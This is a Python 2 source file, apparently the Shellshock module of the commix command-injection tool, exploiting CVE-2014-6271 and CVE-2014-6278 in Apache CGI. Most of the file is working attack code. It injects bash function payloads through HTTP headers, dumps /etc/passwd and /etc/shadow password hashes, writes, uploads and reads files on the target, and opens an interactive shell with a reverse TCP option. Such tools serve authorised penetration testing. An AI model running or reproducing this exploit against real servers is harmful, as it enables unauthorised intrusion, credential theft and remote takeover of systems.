#!/usr/bin/env python

import re
import os
import sys
import urllib2
import readline

from src.utils import menu
from src.utils import logs
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.injections.controller import checks

"""
This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
[1] CVE-2014-6271: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
[2] CVE-2014-6278: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
"""

# Available HTTP headers
headers = [
"User-Agent",
"Referer",
"Cookie"
]

# Available Shellshock CVEs
shellshock_cves = [
"CVE-2014-6271",
"CVE-2014-6278"
]

"""
Available shellshock payloads
"""
def shellshock_payloads(cve, attack_vector):
  if cve == shellshock_cves[0] :
    payload = "() { :; }; " + attack_vector
  elif cve == shellshock_cves[1] :
    payload = "() { _; } >_[$($())] { " + attack_vector + " } "
  else:
    pass
  return payload

"""
Shellshock bug exploitation
"""
def shellshock_exploitation(cve, cmd):
  attack_vector = " echo; " + cmd + ";"
  payload = shellshock_payloads(cve, attack_vector)
  return payload

"""
Enumeration Options
"""
def enumeration(url, cve, check_header, filename):

  #-------------------------------
  # Hostname enumeration
  #-------------------------------
  if menu.options.hostname:
    cmd = settings.HOSTNAME
    shell = cmd_exec(url, cmd, cve, check_header, filename)
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
    sys.stdout.flush()
    # Add infos to logs file. 
    output_file = open(filename, "a")
    output_file.write("    (!) The hostname is " + shell + ".\n")
    output_file.close()
    settings.ENUMERATION_DONE = True

  #-------------------------------
  # Retrieve system information
  #-------------------------------
  if menu.options.sys_info:
    cmd = settings.RECOGNISE_OS            
    target_os = cmd_exec(url, cmd, cve, check_header, filename)
    if target_os == "Linux":
      cmd = settings.RECOGNISE_HP
      target_arch = cmd_exec(url, cmd, cve, check_header, filename)
      if target_arch:
        if menu.options.verbose:
          print ""
        sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("    (!) The target operating system is " + target_os)
        output_file.write(" and the hardware platform is " + target_arch + ".\n")
        output_file.close()
    else:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
      sys.stdout.flush()
      # Add infos to logs file.    
      output_file = open(filename, "a")
      output_file.write("    (!) The target operating system is " + target_os + ".\n")
      output_file.close()
    settings.ENUMERATION_DONE = True

  #-------------------------------
  # The current user enumeration
  #-------------------------------
  if menu.options.current_user:
    cmd = settings.CURRENT_USER
    cu_account = cmd_exec(url, cmd, cve, check_header, filename)
    if cu_account:
      if menu.options.is_root:
        cmd = settings.IS_ROOT
        shell = cmd_exec(url, cmd, cve, check_header, filename)
        if menu.options.verbose:
          print ""
        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
        # Add infos to logs file.    
        output_file = open(filename, "a")
        output_file.write("    (!) The current user is " + cu_account)
        output_file.close()
        if shell:
          if shell != "0":
              sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
              sys.stdout.flush()
              # Add infos to logs file.   
              output_file = open(filename, "a")
              output_file.write(" and it is not privileged.\n")
              output_file.close()
          else:
            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
            sys.stdout.flush()
            # Add infos to logs file.   
            output_file = open(filename, "a")
            output_file.write(" and it is privileged.\n")
            output_file.close()
      else:
        if menu.options.verbose:
          print ""
        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("    (!) The current user is " + cu_account + "\n")
        output_file.close()  
    settings.ENUMERATION_DONE = True

  #-------------------------------
  # System users enumeration
  #-------------------------------
  if menu.options.users:
    cmd = settings.SYS_USERS             
    sys_users = cmd_exec(url, cmd, cve, check_header, filename)
    if menu.options.verbose:
      print ""
    sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
    sys.stdout.flush()
    if sys_users[0] :
      sys_users = "".join(str(p) for p in sys_users).strip()
      if len(sys_users.split(" ")) <= 1 :
        sys_users = sys_users.split("\n")
      else:
        sys_users = sys_users.split(" ")
      # Check for appropriate '/etc/passwd' format.
      if len(sys_users) % 3 != 0 :
        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
        sys.stdout.flush()
        print "\n" + Fore.YELLOW + "(^) Warning: It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
        sys_users = " ".join(str(p) for p in sys_users).strip()
        print sys_users
        output_file = open(filename, "a")
        output_file.write("      " + sys_users)
        output_file.close()
      else:  
        sys_users_list = []
        for user in range(0, len(sys_users), 3):
           sys_users_list.append(sys_users[user : user + 3])
        if len(sys_users_list) != 0 :
          sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
          sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n")
          output_file.close()
          count = 0
          for user in range(0, len(sys_users_list)):
            sys_users = sys_users_list[user]
            sys_users = ":".join(str(p) for p in sys_users)
            count = count + 1
            fields = sys_users.split(":")
            fields1 = "".join(str(p) for p in fields)
            # System users privileges enumeration
            try:
              if not fields[2].startswith("/"):
                raise ValueError()
              if menu.options.privileges:
                if int(fields[1]) == 0:
                  is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
                  is_privileged_nh = " is root user "
                elif int(fields[1]) > 0 and int(fields[1]) < 99 :
                  is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
                  is_privileged_nh = " is system user "
                elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
                  if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
                    is_privileged_nh = " is anonymous user "
                  elif int(fields[1]) == 60002:
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
                    is_privileged_nh = " is non-trusted user "   
                  else:
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
                    is_privileged_nh = " is regular user "
                else :
                  is_privileged = ""
                  is_privileged_nh = ""
              else :
                is_privileged = ""
                is_privileged_nh = ""
              print "  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
              # Add infos to logs file.   
              output_file = open(filename, "a")
              output_file.write("      (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
              output_file.close()
            except ValueError:
              if count == 1 :
                print Fore.YELLOW + "(^) Warning: It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
              sys_users = " ".join(str(p) for p in sys_users.split(":"))
              print sys_users
              output_file = open(filename, "a")
              output_file.write("      " + sys_users)
              output_file.close()
    else:
      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
      sys.stdout.flush()
      print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   

    settings.ENUMERATION_DONE = True

  #-------------------------------------
  # System password enumeration
  #-------------------------------------
  if menu.options.passwords:
    cmd = settings.SYS_PASSES            
    sys_passes = cmd_exec(url, cmd, cve, check_header, filename)
    if sys_passes :
      sys_passes = "".join(str(p) for p in sys_passes)
      sys_passes = sys_passes.replace(" ", "\n")
      sys_passes = sys_passes.split( )
      if len(sys_passes) != 0 :
        if menu.options.verbose:
          print ""
        sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
        sys.stdout.flush()
        sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("\n    (!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" )
        output_file.close()
        count = 0
        for line in sys_passes:
          count = count + 1
          try:
            fields = line.split(":")
            if fields[1] != "*" and fields[1] != "!" and fields[1] != "":
              print "  (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
              # Add infos to logs file.   
              output_file = open(filename, "a")
              output_file.write("      (" +str(count)+ ") " + fields[0] + " : " + fields[1])
              output_file.close()
          # Check for appropriate (/etc/shadow) format
          except IndexError:
            if count == 1 :
              sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
            print fields[0]
            output_file = open(filename, "a")
            output_file.write("      " + fields[0])
            output_file.close()
      else:
        print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL
    settings.ENUMERATION_DONE = True  

  if settings.ENUMERATION_DONE == True:
    print ""

"""
File Access Options
"""
def file_access(url, cve, check_header, filename):

  #-------------------------------------
  # Write to a file on the target host.
  #-------------------------------------
  if menu.options.file_write:
    file_to_write = menu.options.file_write
    if not os.path.exists(file_to_write):
      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '" + file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
      sys.stdout.flush()
      sys.exit(0)
      
    if os.path.isfile(file_to_write):
      with open(file_to_write, 'r') as content_file:
        content = [line.replace("\n", " ") for line in content_file]
      content = "".join(str(p) for p in content).replace("'", "\"")
    else:
      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '" + file_to_write + "' is not a file." + Style.RESET_ALL)
      sys.stdout.flush()
    settings.FILE_ACCESS_DONE = True

    #-------------------------------
    # Check the file-destination
    #-------------------------------
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
    else:
      dest_to_write = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_WRITE + " '" + content + "'" + " > " + "'" + dest_to_write + "'"
    shell = cmd_exec(url, cmd, cve, check_header, filename)
    
    # Check if file exists!
    cmd = "ls " + dest_to_write + ""
    # Check if defined cookie injection.
    shell = cmd_exec(url, cmd, cve, check_header, filename)
    if shell:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was created successfully!" + Style.RESET_ALL)
      sys.stdout.flush()
    else:
     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '" + dest_to_write + "' file." + Style.RESET_ALL)
     sys.stdout.flush()
    settings.FILE_ACCESS_DONE = True

  #-------------------------------------
  # Upload a file on the target host.
  #-------------------------------------
  if menu.options.file_upload:
    file_to_upload = menu.options.file_upload
    
    # check if remote file exists.
    try:
      urllib2.urlopen(file_to_upload)
    except urllib2.HTTPError, err:
      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '" + file_to_upload + "' file, does not exists. (" +str(err)+ ")" + Style.RESET_ALL + "\n")
      sys.stdout.flush()
      sys.exit(0)
      
    # Check the file-destination
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
    else:
      dest_to_upload = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
    shell = cmd_exec(url, cmd, cve, check_header, filename)
    shell = "".join(str(p) for p in shell)
    
    # Check if file exists!
    cmd = "ls " + dest_to_upload
    shell = cmd_exec(url, cmd, cve, check_header, filename)
    shell = "".join(str(p) for p in shell)
    if shell:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!" + Style.RESET_ALL)
      sys.stdout.flush()
    else:
     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '" + dest_to_upload + "' file." + Style.RESET_ALL)
     sys.stdout.flush()
    settings.FILE_ACCESS_DONE = True

  #-------------------------------------
  # Read a file from the target host.
  #-------------------------------------
  if menu.options.file_read:
    file_to_read = menu.options.file_read
    # Execute command
    cmd = "cat " + settings.FILE_READ + file_to_read
    shell = cmd_exec(url, cmd, cve, check_header, filename)
    if shell:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
      sys.stdout.flush()
      print shell
      output_file = open(filename, "a")
      output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
      output_file.close()
    else:
     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '" + file_to_read + "' file." + Style.RESET_ALL)
     sys.stdout.flush()
    settings.FILE_ACCESS_DONE = True

  if settings.FILE_ACCESS_DONE == True:
    print ""
    
"""
The main shellshock handler
"""
def shellshock_handler(url, http_request_method, filename):

  counter = 1
  vp_flag = True
  no_result = True
  export_injection_info = False

  injection_type = "results-based command injection"
  technique = "shellshock injection technique"

  sys.stdout.write("(*) Testing the " + technique + "... ")
  sys.stdout.flush()

  try: 
    i = 0
    total = len(shellshock_cves) * len(headers)
    for cve in shellshock_cves:
      for check_header in headers:
        i = i + 1
        attack_vector = "echo " + cve + ":Done;"
        payload = shellshock_payloads(cve, attack_vector)

        # Check if defined "--verbose" option.
        if menu.options.verbose:
          sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)

        header = {check_header : payload}
        request = urllib2.Request(url, None, header)
        response = urllib2.urlopen(request)

        if not menu.options.verbose:
          percent = ((i*100)/total)
          float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
          
          if percent == 100:
            if no_result == True:
              percent = Fore.RED + "FAILED" + Style.RESET_ALL
            else:
              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
          elif cve in response.info():
            percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
          else:
            percent = str(float_percent )+ "%"

          sys.stdout.write("\r(*) Testing the " + technique + "... " +  "[ " + percent + " ]")  
          sys.stdout.flush()

          # Print the findings to log file.
          if export_injection_info == False:
            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
          if vp_flag == True:
            vuln_parameter = "HTTP Header"
            vp_flag = logs.add_parameter(vp_flag, filename, check_header, vuln_parameter, payload)
          logs.update_payload(filename, counter, payload) 

        if cve in response.info():
          no_result = False
          print Style.BRIGHT + "\n(!) The (" + check_header + ") '" + Style.UNDERLINE + url + Style.RESET_ALL + Style.BRIGHT + "' is vulnerable to " + injection_type + "." + Style.RESET_ALL
          print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type.title() + Style.RESET_ALL + ""
          print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
          print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + "\"" + payload + "\"" + Style.RESET_ALL
          if not menu.options.verbose:
            print ""
          # Enumeration options.
          if settings.ENUMERATION_DONE == True :
            if menu.options.verbose:
              print ""
            while True:
              enumerate_again = raw_input("(?) Do you want to enumerate again? [Y/n/q] > ").lower()
              if enumerate_again in settings.CHOISE_YES:
                enumeration(url, cve, check_header, filename)
                break
              elif enumerate_again in settings.CHOISE_NO: 
                break
              elif enumerate_again in settings.CHOISE_QUIT:
                sys.exit(0)
              else:
                if enumerate_again == "":
                  enumerate_again = "enter"
                print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
                pass
          else:
            enumeration(url, cve, check_header, filename)

          # File access options.
          if settings.FILE_ACCESS_DONE == True :
            while True:
              file_access_again = raw_input("(?) Do you want to access files again? [Y/n/q] > ").lower()
              if file_access_again in settings.CHOISE_YES:
                file_access(url, cve, check_header, filename)
                break
              elif file_access_again in settings.CHOISE_NO: 
                break
              elif file_access_again in settings.CHOISE_QUIT:
                sys.exit(0)
              else:
                if file_access_again == "":
                  file_access_again  = "enter"
                print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL
                pass
          else:
            file_access(url, cve, check_header, filename)

          if menu.options.os_cmd:
            cmd = menu.options.os_cmd 
            shell = cmd_exec(url, cmd, cve, check_header, filename)
            print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL 
            sys.exit(0)

          else:
            # Pseudo-Terminal shell
            go_back = False
            go_back_again = False
            while True:
              if go_back == True:
                break
              if settings.ENUMERATION_DONE == False and settings.FILE_ACCESS_DONE == False:
                if menu.options.verbose:
                  print ""
              gotshell = raw_input("(?) Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
              if gotshell in settings.CHOISE_YES:
                print ""
                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                while True:
                  try:
                    # Tab compliter
                    readline.set_completer(menu.tab_completer)
                    readline.parse_and_bind("tab: complete")
                    cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                    cmd = checks.escaped_cmd(cmd)
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                      if os_shell_option == False:
                        if no_result == True:
                          return False
                        else:
                          return True 
                      elif os_shell_option == "quit":                    
                        sys.exit(0)
                      elif os_shell_option == "back":
                        go_back = True
                        break
                      elif os_shell_option == "os_shell": 
                          print Fore.YELLOW + "(^) Warning: You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
                      elif os_shell_option == "reverse_tcp":
                        # Set up LHOST / LPORT for The reverse TCP connection.
                        lhost, lport = reverse_tcp.configure_reverse_tcp()
                        while True:
                          if lhost and lport in settings.SHELL_OPTIONS:
                            result = checks.check_reverse_tcp_options(lhost)
                          else:  
                            cmd = reverse_tcp.reverse_tcp_options(lhost, lport)
                            result = checks.check_reverse_tcp_options(cmd)
                          if result != None:
                            if result == 0:
                              return False
                            elif result == 1 or result == 2:
                              go_back_again = True
                              break
                          # Command execution results.
                          shell = cmd_exec(url, cmd, cve, check_header, filename)
                          if menu.options.verbose:
                            print ""
                          print Back.RED + "(x) Error: The reverse TCP connection to the target host has been failed!" + Style.RESET_ALL
                      else:
                        pass

                    else: 
                      shell = cmd_exec(url, cmd, cve, check_header, filename)
                      print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n" 
                      
                  except KeyboardInterrupt:
                    raise

                  except SystemExit:
                    raise

                  except:
                    print ""
                    sys.exit(0)

              elif gotshell in settings.CHOISE_NO:
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    return True 

              elif gotshell in settings.CHOISE_QUIT:
                sys.exit(0)

              else:
                if gotshell == "":
                  gotshell = "enter"
                print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
                continue
              break
      else:
        continue

  except urllib2.HTTPError, err:
    if settings.IGNORE_ERR_MSG == False:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      continue_tests = checks.continue_tests(err)
      if continue_tests == True:
        settings.IGNORE_ERR_MSG = True
      else:
        raise SystemExit()

  except urllib2.URLError, err:
    if "Connection refused" in err.reason:
      print Back.RED + "(x) Critical: The target host is not responding." + \
            " Please ensure that is up and try again." + Style.RESET_ALL
    raise SystemExit()
    
"""
Execute user commands
"""
def cmd_exec(url, cmd, cve, check_header, filename):

  """
  Check for shellshock 'shell'
  """
  def check_for_shell(url, cmd, cve, check_header, filename):
    try:
      payload = shellshock_exploitation(cve, cmd)

      # Check if defined "--verbose" option.
      if menu.options.verbose:
        sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)

      header = { check_header : payload }
      request = urllib2.Request(url, None, header)
      response = urllib2.urlopen(request)
      shell = response.read().rstrip()
      return shell

    except urllib2.URLError, err:
      print "\n" + Fore.YELLOW + "(^) Warning: " + str(err) + Style.RESET_ALL
      sys.exit(0)

  shell = check_for_shell(url, cmd, cve, check_header, filename)
  if len(shell) == 0:
    cmd = "/bin/" + cmd
    shell = check_for_shell(url, cmd, cve, check_header, filename)
    if len(shell) == 0:
      cmd = "/usr" + cmd
      shell = check_for_shell(url, cmd, cve, check_header, filename)

  return shell

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, http_request_method, filename):       
  if shellshock_handler(url, http_request_method, filename) == False:
    return False

# eof